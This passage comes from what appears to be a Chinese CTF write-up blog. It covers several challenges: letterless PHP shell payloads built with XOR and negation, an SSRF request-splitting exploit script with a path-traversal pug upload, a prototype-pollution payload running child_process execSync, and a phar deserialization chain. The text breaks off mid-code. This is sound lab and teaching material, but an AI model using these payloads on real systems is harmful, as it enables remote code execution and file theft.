href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">PHP不使用数字,字母和下划线写shell</a></p><blockquote><p>count_chars — 返回字符串所用字符的信息</p></blockquote><p>第二个if语句的意思是$_的不重复的字符长度要&lt;=13<br>取反构造phpinfo();进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&quot;phpinfo&quot;);</span><br></pre></td></tr></table></figure></p><p><code>?_=(~%8F%97%8F%96%91%99%90)();</code><br>有回显<br>接下来构造payload探测目录找flag<br>目的是<code>?_=print_r(scandir(.))</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.-&gt;%D1</span><br><span class="line">scandir-&gt; %8C%9C%9E%91%9B%96%8D</span><br><span class="line">print_r-&gt; %8F%8D%96%91%8B%A0%8D</span><br></pre></td></tr></table></figure></p><p>长度超出限制<br>通过异或减少不同的字符，我们需要保留的是<code>();~%ff</code>还可以留有8个不同的字符</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original </span></span><br><span class="line"><span class="comment">#count_char("scandirprint_r.",0x3)==11</span></span><br><span class="line"><span class="comment">#[t,d,_,c,p,n,a,.,i,r,s]</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>] <span class="comment">#when len(temp)==11  </span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">"a=0x%x,b=0x%x,c=0x%x,d=0x%x"</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure><p>整理之后有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%9e%9b%9c%9c%9b%8f)^(%8f%8f%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure></p><p>回显</p><blockquote><p>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p></blockquote><p>所以有 <code>readfile(end(scandir(.)))</code> <code>show_source(end(scandir(.)))</code><br>改一下脚本的table和result<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">table=[<span class="number">0xa0</span>, <span class="number">0x88</span>, <span class="number">0x8a</span>, <span class="number">0x8c</span>, <span class="number">0x8d</span>,<span class="number">0x90</span>,<span class="number">0x91</span>,<span class="number">0xd1</span>,<span class="number">0x96</span>,<span class="number">0x97</span>,<span class="number">0x9a</span>,<span class="number">0x9b</span>,<span class="number">0x9c</span>,<span class="number">0x9e</span>]</span><br><span class="line">result=[<span class="number">0xa0</span>, <span class="number">0x88</span>,<span class="number">0x8d</span>,<span class="number">0xd1</span>,<span class="number">0x97</span>,<span class="number">0x9a</span>,<span class="number">0x9b</span>,<span class="number">0x9c</span>]</span><br></pre></td></tr></table></figure></p><p>有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure></p><h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>node.js express<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file); <span class="comment">//渲染pug文件</span></span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>上传pug文件，在/template/下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>upload路由判断ip是否为127.0.0.1<br>根据mimetype拼接路径，可控<br>可以通过<code>/uploads/../template/</code>上传文件到/template/<br>pug文件包含flag文件<a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank" rel="noopener">pug-包含include</a>)  </p><blockquote><p>对于直接使用的 Web 应用，必须使用从TCP连接中得到的 Remote Address，才是用户真实的IP</p></blockquote><p>用了remoteaddress ,ip不能伪造，考虑ssrf<br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">SSRF</a></p><p>core路由:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="comment">//访问本地,q可控</span></span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">""</span>);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>利用q来访问只允许本地访问的file_upload路由  </p><p>在file_upload里上传.pug文件，修改content-type，利用action渲染pug文件<br><a href="https://xz.aliyun.com/t/2894" target="_blank" rel="noopener">通过拆分攻击实现的SSRF攻击</a></p><blockquote><p>程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符。</p></blockquote><p><a href="https://blog.rwx.kr/nullcon-hackim-2020-split-second/" target="_blank" rel="noopener">Nullcon HackIM 2020 - split second</a></p><blockquote><p>node.js命令执行payload<code>global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;)</code>  </p></blockquote><p>抓个.pug上传的包来构造数据  </p><p>exp from <a href="https://guokeya.github.io/post/hz6_KR03h/" target="_blank" rel="noopener">guoke</a><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Length: 291</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="abc.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">r = requests.get(<span class="string">'http://http://11677f6e-fb23-401a-b5da-eb66185d1871.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="comment">#url编码</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><blockquote><p>最后的GET /flag只是为了闭合HTTP请求</p></blockquote><p>访问/?action=abc</p><p><a href="https://blog.5am3.com/2020/02/11/ctf-node1/#nullcon-HackIM-2020-split-second" target="_blank" rel="noopener">出题人wp</a><br>出题人给的exp是通过命令执行的方式来实现的，在pug里可以通过 <code>#{payload}</code> <code>- payload</code>  来执行pug文件里的命令</p><h1 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h1><p>注册完之后看源码有注释可以下载<a href="http://www.zip![](https://md.vidar.club/uploads/upload_0e3cd44933fa2cfff69f15365340127c.png)" target="_blank" rel="noopener">www.zip![](https://md.vidar.club/uploads/upload_0e3cd44933fa2cfff69f15365340127c.png)</a><br>原型链污染 rce<br>clone()在/action里<br><a href="https://xz.aliyun.com/t/4229#toc-6" target="_blank" rel="noopener">Node.js 原型污染攻击的分析与利用</a><br><a href="https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#%E5%8E%9F%E5%9E%8B" target="_blank" rel="noopener">JavaScript原型链污染初探</a><br>clone()在/action里</p><blockquote><p>该项目使用了ejs作为模板引擎，该模板引擎中通常由eval等操作用于解析<br>express框架，支持Json直接传输数据，并且接收的参数为req.body<br>toUpperCase():字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”</p></blockquote><p>源码注册限制了<code>ADMIN</code><br>让用户名为<code>ADMıN</code>就可以绕过限制注册一个admin账户  </p><p>提示了这个<br><code>Hello,ADMIN ,flag in /flag</code><br>接下来应该就是rce<br>先找一下利用点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>发现源码里的outputFunctionName为undefined，那应该就是这了<br>content-type需要改为json  </p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;); //&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1><p>打开是一个文件上传的界面<br>源码中有提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure></p><p>所以是要想办法读取f1ag.php的内容<br>先找找源码<br>上传文件成功之后在查看文件里找不到传过的文件，看看url发现<br><code>/file.php?file=</code><br>感觉是让我们往后面加东西，试着加了index.php回显了源码<br>class.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>pchar反序列化<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>pop链是C14r中的echo触发<strong>toString,触发</strong>get()<br>只做了后缀名的检测<br>修改后缀名绕过$allowed_types  </p><blockquote><p>phar文件的扩展名是独立的，如果evil.phpr被重命名为了evil.jpg，上面的触发phar反序列化的示例仍然有效  </p></blockquote><p>上传到服务器后利用file_exitsts使用phar://执行代码<br>利用点是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $text = base64_encode(file_get_contents($value));</span><br><span class="line">    <span class="keyword">return</span> $text;</span><br><span 